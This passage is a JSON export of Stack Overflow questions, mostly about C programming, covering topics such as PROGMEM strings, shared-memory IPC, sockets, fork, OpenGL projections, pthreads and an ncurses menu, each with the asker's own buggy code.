char**?","body":"<p>I'm using Arduino and I have this kind of code:</p>\n\n<pre><code>char *swap[100];\nprog_char settings1[] PROGMEM = \"option 1\";\nprog_char settings2[] PROGMEM = \"option 2\";\nprog_char settings3[] PROGMEM = \"option 3\";\n\nPROGMEM char* general[] = {sttings1, settings2, settings3};\n</code></pre>\n\n<p>In a function, I pass <code>general[]</code> array:</p>\n\n<pre><code>void fillArray(char *arr[]){\n    for(int i=0; i&lt;3; i++){\n        strcpy_P(swap,(char*)pgm_read_word(&amp;(arr[i])));  &lt;== Error\n    }\n}\n</code></pre>\n\n<p>I need to pull characters from <code>arr[]</code> and store these in the <code>swap[]</code> array.</p>\n"},{"tags":["c","windows","batch"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":549,"score":1,"question_id":4176931,"title":"What is the Windows equivalent of \"pidof\" from Linux?","body":"<p>In a batchscript, I need to get a list of process IDs with given binary path <code>C:\\path\\to\\binary.exe</code>.\nIn Linux, I can just do <code>pidof /path/to/binary</code>.</p>\n\n<p>Is there a Win32 executable which does the same, supported from WinXP Home to Win7 (tasklist won't work)?</p>\n\n<p>The package which includes this has to be portable, so a 10MB download is not what I'm looking for.</p>\n\n<p>Is there a C function available which does this <em>and</em> is supported from WinXP to Win7? Note: I want to match a process path, not a filename which could be used by other applications too.</p>\n"},{"tags":["c","ipc","shared-memory"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":309,"score":1,"question_id":9315824,"title":"IPC using shared memory","body":"<p>I am writing a simple code in which parent and child process are sharing one queue using shared memory method. But when child process modifies the shared data its somehow not reflecting for parent process and parent process is still accessing the previous value. \nwhere I am attaching a sample code what I am trying to do:</p>\n\n<pre><code>int main()\n{\n    /* Declare fork variables */\n    pid_t childpid;\n\n    /* Declare shared memory variables */\n    key_t key;\n    int shmid;\n    int *front;\n    int *rear;\n    int i;\n    /* Declare semaphore variables */\n    sem_t sem;\n    int pshared = 1;\n    unsigned int value = 1;\n\n    /* Initialize Shared Memory */\n    key = ftok(\"thread1.c\",'R');\n    shmid = shmget(key, 1024, 0644 | IPC_CREAT);\n\n    /* Attach to Shared Memory */\n    rear = shmat(shmid, (void *)0, 0);\n    if(rear == (int *)(-1))\n        perror(\"shmat\");\n\n    front = shmat(shmid, (void *)0, 0);\n    if(front == (int *)(-1))\n        perror(\"shmat\");\n\n    /* Write initial value to shared memory */\n    rear= front;\n    /* Write to Shared Memory */\n    for(i=0; i&lt;5; i++)\n    {\n        rear[i] = 5000+(i+1);\n    }\n    printf(\"value of front is: %d\", *front);\n    rear = &amp;rear[i-1];  \n    /* Initialize Semaphore */\n    if((sem_init(&amp;sem, pshared, value)) == 1)\n    {\n        perror(\"Error initializing semaphore\");\n        exit(1);\n    }\n\n    if((childpid = fork()) &lt; 0) // error occured\n    {\n        perror(\"Fork Failed\");\n        exit(1);\n    }\n    else if(childpid == 0) // child process\n    {\n        printf(\"came in child process\\n\");\n        sem_wait(&amp;sem);\n        for(i=0; i&lt;3; i++){\n            printf(\"rear is: %d\", *rear);\n            rear--;\n        }\n        sem_post(&amp;sem);\n        shmdt(rear);\n\n    }\n    else // parent process\n    {\n        /* Write to Shared Memory */\n        wait(1);\n        sem_wait(&amp;sem);\n        printf(\"came in parent process and rear is: %d\\n\", *rear);\n        sem_post(&amp;sem);\n        shmdt(rear);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Thanks in advance!</p>\n"},{"tags":["c","pointers"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13274583,"title":"Store pointer address in malloced memory","body":"<p>This feels like a silly question, but I just can't work out a clean solution and can't find a similar question in the mass of other pointer related questions.</p>\n\n<p>I have some dynamically allocated memory of unknown type and want to store a pointer inside it at the start. Dynamic memory returned by malloc should be suitably aligned so I don't think I have to worry about alignment when writing to the start of the allocated block.</p>\n\n<p>This is my code, which works, but I'm representing a pointer as a 64-bit integer and want to do it in a more clean/portable way:</p>\n\n<pre><code>void *my_area = malloc(512);\nvoid *my_pointer = get_my_pointer();\n((long long *) my_area)[0] = (long long) my_pointer;\n</code></pre>\n"},{"tags":["c","linux","sockets"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13274315,"title":"Retrieve ip address of client who got a connection reset","body":"<p>I have this code which gets the ip of the client when the client closes or loses the connection.</p>\n\n<pre><code>char buffer[80]; \nssize_t bread;\nstruct sockaddr_in peer;\nsocklen_t peer_len;\n\npeer_len = sizeof(peer);\n\nmemset(&amp;buffer, 0, sizeof(buffer));\n\nbread = read(connectlist[listnum], buffer, 80);\nif (bread &lt; 0)\n{\n\nif(getpeername(connectlist[listnum],(struct sockaddr *) &amp;peer, &amp;peer_len) == -1){\n\n        perror(\"getpeername() failed\");\n    }\n            printf(\"Connection Reset From IP: %s\\n\", inet_ntoa(peer.sin_addr));\n\n                _Print_To_File(inet_ntoa(peer.sin_addr));\n                    close(connectlist[listnum]);\n                        close(connectlist[listnum]);\n                            connectlist[listnum] = 0;\n\n}\n\nif(bread == 0)\n{\nif(getpeername(connectlist[listnum],(struct sockaddr *) &amp;peer, &amp;peer_len) == -1){\n        perror(\"getpeername() failed\");\n    }\n            printf(\"Connection Closed From IP: %s\\n\", inet_ntoa(peer.sin_addr));\n\n                _Print_To_File(inet_ntoa(peer.sin_addr));\n                    close(connectlist[listnum]);\n                            connectlist[listnum] = 0;\n}\n</code></pre>\n\n<p>I can get the ip of the client when Connection Closed but When Connection Reset I don't get the ip of the client. I get 0.0.0.0 on connection reset. How can i fix this. thanks,</p>\n"},{"tags":["c","boolean"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13274230,"title":"how to work with boolean function in c","body":"<p>Anyone please tell me, what is wrong in this code</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nbool func(char *,int);\nvoid main()\n{\n   char *a=\"Interview\";\n   if(func(a,9))\n   {\n      printf(\"True\");\n   }\n   else\n   {\n      printf(\"False\");\n   }\n\n}\nbool func(char *s, int len)\n{\n   if(len &lt; 2)\n      return true;\n   else\n      return s[0] == s[len-1] &amp;&amp; func(&amp;s[1], len-2);\n}\n</code></pre>\n\n<p>I believe this function always returns <code>TRUE</code>. This is an interview question. But, when I try to compile this, it shows <strong>6 errors</strong>.. </p>\n"},{"tags":["c","fork"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13273836,"title":"how to kill child of fork?","body":"<p>I have the following code which create a child fork. And I want to kill the child before it finish its execution in the parent. how to do it?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint i;\n\nmain (int ac, char **av)\n{\n  int pid;\n\n  i = 1;\n\n  if ((pid = fork()) == 0) {\n    /* child */\n    while (1) {\n      printf (\"I m child\\n\");\n      sleep (1);\n    }\n  }\n  else {\n    /* Error */\n    perror (\"fork\");\n    exit (1);\n  }\n  sleep (10)\n\n   // TODO here: how to add code to kill child??\n\n}\n</code></pre>\n"},{"tags":["c","opengl","glut","projection","orthographic"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13272046,"title":"switch from glOrtho to gluPerspective","body":"<p>I have a car draw at (0,0) and some obstacles set up but right now my main concern is switching from glPerspective to glOrtho and vice-versa. All that i get when i switch from perspective to ortho is a black screen.</p>\n\n<pre><code>void myinit(){\n    glClearColor(0.0,0.0,0.0,0.0);\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluPerspective(60,ww/wh,1,100);\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n    gluLookAt(-5,5,3,backcarx,topcarx,0,0,0,1);\n}\n\nvoid menu(int id){\n    /*menu selects if you want to view it in ortho or perspective*/\n    if(id == 1){\n        glClear(GL_DEPTH_BUFFER_BIT);\n        glViewport(0,0,ww,wh);\n        glMatrixMode(GL_PROJECTION);\n        glLoadIdentity();\n        glOrtho(-2,100,-2,100,-1,1);\n        glMatrixMode(GL_MODELVIEW);\n        glutPostRedisplay();\n    }\n    if(id == 2){\n        glMatrixMode(GL_PROJECTION);\n        glLoadIdentity();\n        gluPerspective(60,ww/wh,1,100);\n        glMatrixMode(GL_MODELVIEW);\n        glLoadIdentity();\n        viewx = backcarx - 10;\n        viewy = backcary - 10;\n        gluLookAt(viewx,viewy,viewz,backcarx,topcarx,0,0,0,1);\n    }\n}\n</code></pre>\n\n<p>i've tried using the clear depth buffer and still doesnt work.</p>\n"},{"tags":["c","pthreads"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13273052,"title":"Must a call to pthread_cond_wait be woken up by pthread_cond_signal?","body":"<p>The title basically speaks for itself.  If I make a call to pthread_cond_wait with a particular condition and mutex, will that thread stay blocked until a call to pthread_cond_signal is made with the corresponding condition?  Or will it unblock regardless if the mutex is subsequently unlocked again?</p>\n\n<p>If the answer is the former, I have a follow-up.  I have a queue used for message-passing between my threads.  I want to ensure only one thread can append an item to the queue at a time (hence the use of mutexes).  None of the threads have any idea if any other thread will be waiting to take hold of the mutex themselves.</p>\n\n<p>When attempting to append an item to the queue, I lock the mutex, wait for the queue to not be full with a pthread condition, then perform the append, then unlock the mutex.  Before unlocking it, should I perform a pthread_cond_signal, even if I don't know whether or not any other threads will be waiting?  What happens if multiple threads are waiting?</p>\n"},{"tags":["c","function","calculator"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":46,"score":-1,"question_id":13264037,"title":"Coding a simple parking fee calculator using only C functions","body":"<p>I have been given the following assignment: </p>\n\n<blockquote>\n  <p>Write a function (documentation included) that given the entry and the\n  exit time of a vehicle in a parking lot, and the hourly rate,\n  calculates the amount due.</p>\n  \n  <p>Assumptions:</p>\n  \n  <ol>\n  <li>no overnight parking</li>\n  <li>there is no charge for part of an hour</li>\n  <li>the time is given in military style (1:20p.m. is 1320)</li>\n  </ol>\n  \n  <p>You also have to write a test-driver for your function:  in main()\n  declare and initialize as many variables as needed,  then call the\n  function and display the amount.</p>\n</blockquote>\n\n<p>This is the code:</p>\n\n<pre><code>int calcRate (int entry , int exit);\n\nint main (void)\n{\n    // Local Declarations\n    int entry;\n    int exit;\n\n    //Statements\n    printf(\"Please Enter Entry and Exit time(In military style. For example : 9.30am as\n           0930)\\n\");\n    scanf(\"%d %d\\n\",&amp;entry , &amp;exit);\n\n    double fee = calcRate(entry,exit);\n\n    printf(\"Your Parking Fees are %f\\n\", fee);\n\n    return 0;\n}   //main\n\n/*==============calcRate================\n This function calculates the cost of parking\n */\n\ndouble calcRate (int entry,int exit,double cost)\n{\n    int hours;\n    double rate = 2.00;\n    //Statements\n    hours = (exit-entry)/100;\n    cost = hours * rate;\n\n    return (cost);\n}\n//calcRate\n</code></pre>\n\n<p>I cannot build it and I am facing problems with it. For example, I get the following error:</p>\n\n<blockquote>\n  <p>Undefined symbols for architecture x86_64: \"calcRate(int, int)\", referenced from: _main in Parking.o (maybe you meant: calcRate(int, int, double)</p>\n</blockquote>\n\n<p>I'm stuck for almost 2 hours now.\nAny kind souls out there?</p>\n"},{"tags":["c","arrays","fscanf"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13273746,"title":"copying integers into an array using fscanf(). in C","body":"<p>i have a file with several rows of 10 integers. </p>\n\n<p>i want to copy those integers into several arrays, named line1, line2, line3 etc with numbers from each row in a corresponding array. </p>\n\n<p>i am currently using</p>\n\n<pre><code>fscanf(items, \"%d, %d, %d, %d, %d, %d, %d, %d, %d, %d\", &amp;line1[0], &amp;line1[1], &amp;line1[2], &amp;line1[3], &amp;line1[4], &amp;line1[5], &amp;line1[6], &amp;line1[7], &amp;line1[8], &amp;line1[9]);\n</code></pre>\n\n<p>to assign the first 10 ints to an array named line1.</p>\n\n<p>this is a really sloppy way to do it, and it doesn't tackle the other issue of assigning the rest of the values to other arrays.</p>\n\n<p>any suggestions on how to assign 10 values to an array more neatly, and how to assign each row to a different array would be greatly appreciated!</p>\n\n<p>thanks</p>\n"},{"tags":["c","file","newline","fgetc"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13273095,"title":"fgetc stops when recognizing new line (\\n)","body":"<p>I have this code:</p>\n\n<pre><code>while( (cCurrent = fgetc(fp)) != EOF)\n{\n\n}\n</code></pre>\n\n<p>The problem is, when it hits a new line it stops reading.</p>\n\n<p>What would be a good way to ignore the newline character?</p>\n\n<p>Edit:</p>\n\n<p>I'm trying to create a file crypter.\nIt is able to encrypt the file, but the decrypt process won't work.\nIt works till the end of the first line, but it won't continue to the next characters in the file.</p>\n\n<p>For example, for the text file:  </p>\n\n<pre><code>Foo  \nBar\n</code></pre>\n\n<p>After the encryption the result is:  </p>\n\n<blockquote>\n  <p>Xu||Gb|t</p>\n</blockquote>\n\n<p>After the decryption the result is:</p>\n\n<blockquote>\n<pre><code>FooRqb\n</code></pre>\n</blockquote>\n\n<p>I concluded that the new line char was the problem. maybe it wasn't.</p>\n\n<p>My code is:</p>\n\n<pre><code>/* check if the file is openable */\nif( (fp = fopen(szFileName, \"r+\")) != NULL )\n{\n    /* save current position */\n    currentPos = ftell(fp);\n    /* get the current byte and check if it is EOF, if not then loop */\n    while( (cCurrent = fgetc(fp)) != EOF)\n    {\n        /* XOR it */\n        cCurrent ^= 0x10;\n        /* take the position indicator back to the last position before read byte */\n        fseek(fp, currentPos, SEEK_SET);\n        /* set the current byte */\n        fputc(cCurrent, fp);\n        /* reset stream for next read operation */\n        fseek(fp, 0L, SEEK_CUR);\n        /* save current position */\n        currentPos = ftell(fp);\n    }\n</code></pre>\n"},{"tags":["c++","ios","c","math","voice-recognition"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":9,"view_count":101,"score":-9,"question_id":13177358,"title":"Voice pitch detection function in C++","body":"<p>I really need your help.</p>\n\n<p>I need to make an application that can detect the pitch of the sound. So may i have any tutorial or sample C++ class which takes voice data and returns detected pitch.</p>\n\n<p>I hope I'll get early answers , either they are useful or not.</p>\n\n<p>Actually it might be possible the I may not be good enough to convey what I want to ask. So elaborating more I don't know how to do fft of a voice signal and how to apply band pass filter, while googling, I found that detection of voice pitch needs fft conversion of voice signal power and then implementing band pass filter to it. So I just need the formula/algorithm or any way of fft in c++.</p>\n"},{"tags":["android","c","gcc","android-ndk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13273743,"title":"Compile native C code with android libraries","body":"<p>I have a native C code to android (I'm not using JNI, it's pure C) and I want to print log messages on LogCat.\nWithout using <code>#include&lt;android/log.h&gt;</code> I was able to compile with <code>arm-linux-gnueabi-gcc -static -o Matrix MatrixMultiplication.c</code> and it worked very well, but now i need to send to LogCat some messages with <code>#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG , \"NativeC\", __VA_ARGS__)</code>. I tried to import the library but it didn't work and this: <a href=\"http://betelco.blogspot.com.br/2010/01/buildingdebugging-android-native-c.html\" rel=\"nofollow\">http://betelco.blogspot.com.br/2010/01/buildingdebugging-android-native-c.html</a> . I'm using  android-ndk-r8b</p>\n\n<p>How can i do this? </p>\n\n<p>thanks</p>\n"},{"tags":["c","netbeans","ide","linker"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12004670,"title":"How can I define a custom linker to be used by netbeans for my custom makefile driven C project?","body":"<p>I'm trying to build a makefile driven project from Netbeans. It builds fine from my command line. I use a custom toolchain. This is all set up in my terminal environment, but Netbeans doesn't seem to inherit this and likes to have a full definition of the tools. I've found the options to define the compiler, assembler and make. I can't find an option for the linker. Any suggestions? I could hack the makefile, but I don't want to do that.</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","c99"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13273676,"title":"Is RAND_MAX guranteed to be <= UINT_MAX?","body":"<p>I'm trying to determine if RAND_MAX can fit inside an unsigned int variable. After looking through the C99 standard, I have only found that RAND_MAX is guaranteed to have a value of at least 32767. While I know that RAND_MAX expands to int value, I'm not sure if it's a long int. Right now I'm working with unsigned long int variables, but I would like to simplify my source code to use unsigned int variables.</p>\n\n<p>To summarize, is this assumption statement true for the C99 standard:</p>\n\n<p>RAND_MAX &lt;= UINT_MAX &lt;= ULONG_MAX</p>\n\n<p>Also, is RAND_MAX is explicitly less than (i.e. not equal to) UINT_MAX or ULONG_MAX. I realize that the value of RAND_MAX is often a Mersenne prime, but I'm not sure if this is a standard.</p>\n"},{"tags":["c","sockets","select"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":23,"score":2,"question_id":13271481,"title":"FD_SETSIZE versus calculated value","body":"<p>In a server/client setup I have a server connecting with clients on a handful (at the moment 4) of different sockets. At the moment I use select with a calculated set_size, but what are the upper limit, before it is worthwhile to use FD_SETSIZE instead?</p>\n\n<p>Below are some code examples to illustrate the point. First building the set:</p>\n\n<pre><code>FD_ZERO(&amp;set);\nFD_SET(socket1, &amp;set);\nFD_SET(socket2, &amp;set);\nFD_SET(socket3, &amp;set);\nFD_SET(socket4, &amp;set);\n</code></pre>\n\n<p>Here is how the set_size is calculated:</p>\n\n<pre><code>set_size = MAX(socket1, socket2);\nset_size = MAX(set_size, socket 3);\nset_size = MAX(set_size, socket4);\nset_size += 1;\n</code></pre>\n\n<p>And the usage:</p>\n\n<pre><code>while ((cnt = select(set_size, &amp;set, NULL, NULL, &amp;t)) != -1 || errno == EINTR) {\n    if (cnt &gt; 0)\n        // Do different stuff depending what socket is active\n    else\n        // Keep everything alive and add the sockets to the set again\n}\n</code></pre>\n\n<p>Recently I had to add a two new sockets and I might need to add more in the future. When would you use FD_SETSIZE as opposed to the calculated set_size?</p>\n"},{"tags":["c","gcc","linux-kernel","boolean"],"answer_count":10,"favorite_count":5,"up_vote_count":32,"down_vote_count":0,"view_count":15911,"score":32,"question_id":1608318,"title":"Is bool a native C type?","body":"<p>I've noticed that the Linux kernel code uses bool, but I thought that bool was a C++ type. Is bool a standard C extension (e.g., ISO C90) or a GCC extension?</p>\n"},{"tags":["c","overflow"],"answer_count":14,"favorite_count":29,"up_vote_count":116,"down_vote_count":1,"view_count":3086,"score":115,"question_id":13237046,"title":"How to avoid overflow in expr. A * B - C * D","body":"<p>I need to compute an expression which looks like:\n<code>A*B - C*D</code>, where their types are: <code>signed long long int A, B, C, D;</code>\nEach number can be really big (not overflowing its type). While <code>A*B</code> could cause overflow, at same time expression <code>A*B - C*D</code> can be really small. How can I compute it correctly?</p>\n\n<p>For example: <code>MAX * MAX - (MAX - 1) * (MAX + 1) == 1</code>, where <code>MAX = LLONG_MAX - n</code> and n - some natural number.</p>\n"},{"tags":["c","string","struct"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13273623,"title":"C structure member is a string, how to assign bytes directly","body":"<p>I am working on a simple filesystem, which (obviously) contains folders, files, etc.</p>\n\n<p>A (simplified version of a) folder is represented by a structure while in RAM like so:</p>\n\n<pre><code>typedef struct{\n     char label[20];\n     unsigned int id;\n     t_node contents[50];\n } folder;\n</code></pre>\n\n<p>Now, i obviously want label to contain the raw byte string with in it the name (even better would be the raw string without trailing 0, but that's a sacrifice I am willing to make).</p>\n\n<p>No,here's how I create and use a struct:</p>\n\n<pre><code>folder* myFolder = (folder *) malloc(sizeof(folder));\nmyFolder-&gt;label = \"name\";\n\n//Which doesn't work, if I try this:\n\nchar name[20] = \"name\";\nmyFolder-&gt;label = name;\n\n//this too, doesn't work.\n</code></pre>\n\n<p>The error message says \"incompatible types when assigning to type ‘char[20]’ from type ‘char *’\".\nWhich I understand, but don't know how to resolve.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["c","linux","signals","handlers"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":618,"score":2,"question_id":6015498,"title":"executing default signal handler","body":"<p>I have written an application where i have registered number of signal handler for different signals in linux .\nAfter process receives the signal the control is transferred to the signal handler i had registered. In this signal handler i do some work which i need to do and the i would like to call the default signal hander i.e SIF_DFL or SIG_IGN .\nBut SIG_DFL and SIG_ING are macro which expands to numeric value 0 and 1 , which are invalid function address. </p>\n\n<p>IS there any way i can call default actions i.e SIG_DFL or SIG_IGN ?</p>\n\n<p>In order to achieve the effect of  SIG_DFL or SIG_ING i call exit(1) and do nothing , respectively . But for signals like SIGSEGV i also would like to have core dump . \nIn general i would want to my default behavior to be same as SIG_DFL and ignore behavior same SIG_IGN , the way Operating system would do . </p>\n"},{"tags":["c","for-loop"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":58,"score":-6,"question_id":13271922,"title":"How do I enter a number and count in sequence 10 numbers higher using a for loop","body":"<p>How can I get a user to input a number then the program increments the users number by 10? </p>\n\n<p>for example the user enters 5 the number 5 increments like this 5 6 7 8 9 10 11 12 13 14 \n15</p>\n\n<p>This is my code so far. </p>\n\n<pre><code>int main (void)\n{\n\n    int i;\n\n    for(i=1; i&lt;10; i++);\n    {\n         printf(\"enter a number:\");\n         scanf(\"%d\" , &amp;i);\n    }\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","linux","gcc"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":53,"score":-2,"question_id":13272683,"title":"New .h file in /usr/include linux","body":"<p>I developed small c application in linux. For this application i placed .h file in\nlinux standard path (/usr/include).  Again i am compiling the same program </p>\n\n<p><strong>Output:\nFATA ERROR : xyz.h(my own header file) not found</strong> </p>\n\n<p>Do i need to update any variable in gcc or way to solve this problem</p>\n\n<p>Thank You</p>\n"},{"tags":["c","eclipse","index"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":52,"score":5,"question_id":13269092,"title":"eclipse C project shows errors (Symbol could not be resolved) but it compiles","body":"<p>I have got access to a C project at work that I have to implement some stuff in. I was able to load it into eclipse and can <code>Project -&gt; Build All</code> it. Compilation shows no errors or warnings. But in eclipse, there are a lot of errors shown. One example:</p>\n\n<hr>\n\n<p>There is an enum</p>\n\n<pre><code>typedef enum MeasurementType {\n    PN, BB, AM, RES\n} MEAS_TYPE;\nMEAS_TYPE type;\n</code></pre>\n\n<p>in one of the files. It is used somewhere else and produces an error like this:\n<img src=\"http://i.stack.imgur.com/JO251.png\" alt=\"enter image description here\"></p>\n\n<p>It is most interesting, that only <code>AM</code> seems to be a problem, not <code>PN</code> or <code>BB</code>. </p>\n\n<hr>\n\n<p>I haven't found a satisfying solution to this. I already tried to include all possible directories I could think of in <code>Project Properties -&gt; C/C++ General -&gt; Paths and Symbols</code> (like <a href=\"http://stackoverflow.com/a/10554556/1137043\">this post</a> suggests), but that didn't help.</p>\n\n<p>The project itself is compiled with Makefiles (which is why I need <code>Project -&gt; Build All</code>). Can it be that eclipse does not interpret those Makefiles correctly or something? I am a bit lost after messing around with that stuff for a few hours and not getting a single step forward.</p>\n\n<p>EDIT: Here are some screenshots for my build-relevant project properties (at least I believe they are relevent :D). Tell me if you need more information.</p>\n\n<p><img src=\"http://i.stack.imgur.com/I8m1z.png\" alt=\"enter image description here\"> <img src=\"http://i.stack.imgur.com/8x8ZO.png\" alt=\"enter image description here\"></p>\n"},{"tags":["c","string","variables","inside","output"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":48,"score":-4,"question_id":13272602,"title":"Output variable contents in a string in C","body":"<p>In C++ I am performing the following:</p>\n\n<pre><code>cout&lt;&lt;\"a[\"&lt;&lt;i+1&lt;&lt;\",&lt;&lt;\"j+1&lt;&lt;\"]= \"; cin&gt;&gt;a[i][j]; \n</code></pre>\n\n<p>(displays: \"a[1][1]= \" and gets input for a[0][0]; basically the i+1 is just a trick for the viewer because i want to use the array from the 0 not 1 but that's not the point).</p>\n\n<p>How do I accomplish this in C using printf and scanf?\nApparently C doesn't like </p>\n\n<pre><code>printf(\"a[\"&lt;&lt;i+1&lt;&lt;\",\"&lt;&lt;j+1&lt;&lt;\"]= \"); scanf(\"%d\", a[i][j]);\n</code></pre>\n\n<p>Basically, what's the equivalent of the </p>\n\n<pre><code>&lt;&lt;i+1&lt;&lt; \n</code></pre>\n\n<p>in C language?</p>\n\n<p>Thanks a lot! :D</p>\n"},{"tags":["c++","c","enums"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":13272480,"title":"ENUM types and usage in c and c++","body":"<p>if I wrote like this:</p>\n\n<pre><code>typedef enum {\n  foo_1,\n  foo_2\n}foo ;\n</code></pre>\n\n<p>I found that I can use </p>\n\n<p><code>int footype = foo::foo_1</code> in c++ </p>\n\n<p>and  I can directly use</p>\n\n<p><code>int footype = foo_1</code> in c,</p>\n\n<p>so is there a way that can write same code that works both in c++ and c? the code is inside   one  header file with only one structure.</p>\n"},{"tags":["c","windows","serial-port","usbserial"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":233,"score":0,"question_id":9821123,"title":"Write to serial adapter in C","body":"<p>I am working on a project and I'm trying to figure out how I'm going to write to the serial port. Since my laptop does not have a serial port, I have purchased a USB to serial adapter. Now I need to send data from my C program to the serial port but I do not know how to address the port. Does anyone have any idea how this is done?</p>\n\n<p>When I had worked on a Windows 98 I used <code>outportb()</code> to address the parallel port but this will not work on Windows 7. </p>\n\n<p>(I am using Windows 7 64 bit.)</p>\n"},{"tags":["c++","c","windows","winapi","sprintf"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13269146,"title":"What is StringCbprintf and how's this different than general sprintf?","body":"<p>I am going through a previously written code and I found <code>StringCbPrintf()</code> function</p>\n\n<p>I found declaration on <code>msdn</code> site like this :</p>\n\n<pre><code>HRESULT StringCbPrintf(\n  _Out_  LPTSTR pszDest,\n  _In_   size_t cbDest,\n  _In_   LPCTSTR pszFormat,\n  _In_    ...\n);\n</code></pre>\n\n<p>What is <code>_in_</code> and <code>_out_</code> here ?</p>\n\n<p>And why is it needed when we already have <code>sprintf()</code> ?</p>\n"},{"tags":["c","casting","malloc"],"answer_count":6,"favorite_count":61,"up_vote_count":111,"down_vote_count":0,"view_count":7859,"score":111,"question_id":605845,"title":"Do I cast the result of malloc?","body":"<p>In <a href=\"http://stackoverflow.com/questions/571945/getting-a-stack-overflow-exception-when-declaring-a-large-array\">this question</a>, someone suggested in a comment that I should not cast the results of <code>malloc</code>, <em>i.e</em>:</p>\n\n<pre><code>int *sieve = malloc(sizeof(int)*length);\n</code></pre>\n\n<p>rather than:</p>\n\n<pre><code>int *sieve = (int *)malloc(sizeof(int)*length);\n</code></pre>\n\n<p>Why would this be the case?</p>\n"},{"tags":["c","ncurses"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":36,"score":-4,"question_id":13269581,"title":"Need to understand below function from a program of ncurses","body":"<p><img src=\"http://i.stack.imgur.com/YnUQI.png\" alt=\"output of my program\"></p>\n\n<p>I am using ncurses.A menu is made as a newwin of the stdscr,as item[0].I want to make two more subwin of item[0],in the upper side with MENU and in the downward side with 2 option select and cancel.After select a new window with other options must come.I am new to ncurses as well as to C,need help.I had already posted many questions,kindly help me.</p>\n\n<p>below is my code that is creating that output.</p>\n\n<pre><code>#include &lt;curses.h&gt;\n#include &lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n\n#define ENTER 10\n#define ESCAPE 27\nvoid init_curses()\n{\n    initscr();\n    start_color();\n    init_pair(1,COLOR_WHITE,COLOR_BLUE);\n    init_pair(2,COLOR_BLUE,COLOR_WHITE);\n    init_pair(3,COLOR_RED,COLOR_WHITE);\n    curs_set(0);\n    //noecho();\n    keypad(stdscr,TRUE);\n}\nvoid draw_title(WINDOW *title)\n{\n    wbkgd(title,COLOR_PAIR(2));\n    waddstr(title,\"SELECTION\");\n    wmove(title,0,12);\n    wattron(title,COLOR_PAIR(3));\n    waddstr(title,\"MENU\");\n    wattroff(title,COLOR_PAIR(3));\n}\n\nWINDOW **draw_menu(int start_col)\n{\n\n    WINDOW **items;\n    items=(WINDOW **)malloc(9*sizeof(WINDOW *));\n\n    items[0]=newwin(20,50,12,50);\n    wbkgd(items[0],COLOR_PAIR(2));\n    box(items[0],ACS_VLINE,ACS_HLINE);\n    items[1]=subwin(items[0],1,25,15,65);\n    wprintw(items[1],\"1  System Information\",1);\n    items[2]=subwin(items[0],1,25,16,65);\n    wprintw(items[2],\"2  Network Setting\",2);\n    items[3]=subwin(items[0],1,25,17,65);\n    wprintw(items[3],\"3  Change Password\",3);\n    items[4]=subwin(items[0],1,25,18,65);\n    wprintw(items[4],\"4  System Services\",4);\n    items[5]=subwin(items[0],1,25,19,65);\n    wprintw(items[5],\"5  Edit Host Files\",5);\n    items[6]=subwin(items[0],1,25,20,65);\n    wprintw(items[6],\"6  Set System Files\",6);\n    items[7]=subwin(items[0],1,25,21,65);\n    wprintw(items[7],\"7  Set Function Keys\",7);\n    items[8]=subwin(items[0],1,25,22,65);\n    wprintw(items[8],\"8  Check Terminl Answerback\",8);\n    wbkgd(items[1],COLOR_PAIR(1));\n    wrefresh(items[0]);\n    return items;\n}\n\nvoid write_data0()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) 